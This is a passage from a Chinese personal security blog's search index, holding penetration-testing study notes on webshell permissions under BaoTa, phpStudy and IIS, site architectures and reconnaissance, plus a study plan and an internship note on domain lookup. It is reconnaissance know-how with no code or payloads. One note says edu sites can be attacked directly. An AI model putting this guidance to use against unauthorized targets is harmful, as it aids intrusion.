id="2-影响：攻击者权限对比区别（不同软件影响也不同）"><a href="#2-影响：攻击者权限对比区别（不同软件影响也不同）" class="headerlink" title="2.影响：攻击者权限对比区别（不同软件影响也不同）"></a>2.影响：攻击者权限对比区别（不同软件影响也不同）</h3><p>和常规搭建的网站最大区别就是权限区别 </p><p>宝塔：拿到权限后，webshell执行不了，文件管理锁定目录，只能看到当前网站目录，其他目录看不到，没有权限，宝塔自动加了限制    </p><p>phpstudy：whoami 获取用户权限 -administartor</p><p>自己IIS搭建有一半webshell能执行,目录也能查看一般</p><h2 id="三、docker-容器（都是假的，除非逃逸出去）"><a href="#三、docker-容器（都是假的，除非逃逸出去）" class="headerlink" title="三、docker 容器（都是假的，除非逃逸出去）"></a>三、docker 容器（都是假的，除非逃逸出去）</h2><p>原理：虚拟化技术独立磁盘空间，非真实物理环境</p><p>影响：攻击者虚拟空间磁盘 </p><h2 id="四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"><a href="#四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）" class="headerlink" title="四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"></a>四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）</h2><h3 id="1-托管（有版权）（面对的是安全公司）"><a href="#1-托管（有版权）（面对的是安全公司）" class="headerlink" title="1.托管（有版权）（面对的是安全公司）"></a>1.托管（有版权）（面对的是安全公司）</h3><h3 id="2-申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"><a href="#2-申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）" class="headerlink" title="2.申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"></a>2.申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）</h3><p>原理：利用别人域名模版建立  </p><p>影响：实质安全测试非目标资产</p><h2 id="五、静态Web"><a href="#五、静态Web" class="headerlink" title="五、静态Web"></a>五、静态Web</h2><p>例子：大学学的html设计的网站（单一，想修改页面只能改源代码）</p><p>原理：数据没有传输性（js传输不算）</p><p>影响：无漏洞</p><h2 id="六、伪静态"><a href="#六、伪静态" class="headerlink" title="六、伪静态"></a>六、伪静态</h2><p>动态转为静态技术，伪装的静态</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20181607.png" alt="屏幕截图 2023-06-04 181607"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>01web常规-系统&amp;中间件&amp;数据库&amp;源码</title>
      <link href="/du-yu/information-collection-01.html"/>
      <url>/du-yu/information-collection-01.html</url>
      
        <content type="html"><![CDATA[<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20090622.png" alt="屏幕截图 2023-06-04 090622" style="zoom: 67%;"><h2 id="web四大件作用"><a href="#web四大件作用" class="headerlink" title="web四大件作用"></a>web四大件作用</h2><p>系统、中间件、数据库、源代码</p><h2 id="网站有哪些展示"><a href="#网站有哪些展示" class="headerlink" title="网站有哪些展示"></a>网站有哪些展示</h2><p>子域名模式 </p><p>端口模式</p><p>目录模式</p><p>公司发放的IP，扫描时扫描公司所有的IP</p><p>##文件访问解析</p><p>中间件、解析规则：中间解析规则决定上传到目标是什么类型</p><p>源文件的权限决定</p><p>锁图片文件，依旧可看，但没有执行了，有后门也不行</p><h2 id="源码配置文件"><a href="#源码配置文件" class="headerlink" title="源码配置文件"></a>源码配置文件</h2><p>1.数据库直接放在本地</p><p>2.数据库和网站分离，放在另外一个服务器上</p><p>数据库直接放到云端，拿到数据库账户密码也不行，云端只支持网站源码连接，可能只允许某些账号或目标访问</p><p>app.config数据库配置文件</p><h2 id="源码开源"><a href="#源码开源" class="headerlink" title="源码开源"></a>源码开源</h2><p>开源-源码可见</p><p>开源-源码不可见：各种加密，百度上有ASP加密     ，PHP加密什么的</p><p>语言特性决定：java运行以后就会改变                     </p><p>开源是为了白盒测试-代码审计</p><h2 id="源码结构目录"><a href="#源码结构目录" class="headerlink" title="源码结构目录"></a>源码结构目录</h2><p>admin后台管理相关</p><p>bin指引目录</p><p>database数据库相关</p><p>images图片相关</p><p>js前端文件</p><p>member会员</p><p>template模板</p><p>upfiles文件上传</p><p>webservice网站服务</p><p>##路由访问</p><p>常规：url+文件路径            url和文件目录对应不上，要根据路由配置决定</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><h3 id="常规化"><a href="#常规化" class="headerlink" title="常规化"></a>常规化</h3><p>原理：源码数据都在同服务器</p><p>影响：无，常规安全测试手法</p><h3 id="站库分离："><a href="#站库分离：" class="headerlink" title="站库分离："></a>站库分离：</h3><p>原理：源码数据库不在同服务器</p><p>存储：其他服务器上数据库&amp;云数据库产品</p><p>影响：数据被单独存放，能连接才可影响数据</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Destiny-plan</title>
      <link href="/du-yu/destiny-plan.html"/>
      <url>/du-yu/destiny-plan.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、备忘录"><a href="#一、备忘录" class="headerlink" title="一、备忘录"></a>一、备忘录</h1><p>1、美化终端<br>2、复盘<br>3、金砖<br>4、渊龙sec团队招新<br>5、Tryhackme<br>6、看迪宝！！！<br>7、世界战队排名！！<br>8、7月底的护网<br>9、edu可以直接打，证明有漏洞就行，不要碰其他（文件上传证明可以解析即可，不强制webhell，木马和phpinfo都不用证明，输出123就行了）<br>10、出题！！！！</p><h1 id="二、护网"><a href="#二、护网" class="headerlink" title="二、护网"></a>二、护网</h1><p>1、面试<br>2、国护！！！</p><h1 id="三、PWN"><a href="#三、PWN" class="headerlink" title="三、PWN"></a>三、PWN</h1><h1 id="四、战队"><a href="#四、战队" class="headerlink" title="四、战队"></a>四、战队</h1><p>WM<br>NUL_1<br>蓝水<br>小猪<br>山海关Arr3sty0u</p><h1 id="五、电子取证"><a href="#五、电子取证" class="headerlink" title="五、电子取证"></a>五、电子取证</h1><h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><p>1、ISCC线下决赛<br>2、金砖9月报名截止<br>3、蓝帽杯<br>4、强网杯<br>5、天网杯（安全漏洞挖掘大赛）<br>6、公安内网<br>7、AVSS<br>8、</p>]]></content>
      
      
      <categories>
          
          <category> Destiny </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实习-信息收集</title>
      <link href="/du-yu/police-practice-01.html"/>
      <url>/du-yu/police-practice-01.html</url>
      
        <content type="html"><![CDATA[<h1 id="IP查询-amp-域名、网址分析"><a href="#IP查询-amp-域名、网址分析" class="headerlink" title="IP查询&amp;域名、网址分析"></a>IP查询&amp;域名、网址分析</h1><h2 id="总述：赶紧学习啊！！！"><a href="#总述：赶紧学习啊！！！" class="headerlink" title="总述：赶紧学习啊！！！"></a>总述：赶紧学习啊！！！</h2><p>实习第一天，让我解析一下领导留言板的域名：<a href="http://liuyan.people.com.cn/%EF%BC%8C%E5%88%9A%E5%BC%80%E5%A7%8B%E4%BB%A5%E4%B8%BA%E6%98%AF%E6%90%9C%E7%B4%A2IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E5%AE%9A%E4%BD%8D%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%98%AF%E6%8A%8A%E7%9B%B4%E6%8E%A5%E6%8A%8A%E7%BD%91%E5%9D%80%E6%94%BE%E5%88%B0%E7%AB%99%E9%95%BF%E5%B7%A5%E5%85%B7%E9%87%8C%E8%A7%A3%E6%9E%90">http://liuyan.people.com.cn/，刚开始以为是搜索IP地址进行定位，原来是把直接把网址放到站长工具里解析</a></p><h2 id="一、网站IP查询"><a href="#一、网站IP查询" class="headerlink" title="一、网站IP查询"></a>一、网站IP查询</h2><p>想要查询<a href="http://liuyan.people.com.cn/%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%BD%BF%E7%94%A8">http://liuyan.people.com.cn/的IP地址，使用</a> ping liuyan.people.com.cn </p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710095653955.png" alt="image-20230710095653955"></p><h2 id="二、网址分析"><a href="#二、网址分析" class="headerlink" title="二、网址分析"></a>二、网址分析</h2><p>使用站长工具：<a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p><p>直接搜索网址</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710101151951.png" alt="image-20230710101151951"></p><p>感觉是<strong>资产收集</strong></p>]]></content>
      
      
      <categories>
          
          <category> 实习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实习-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
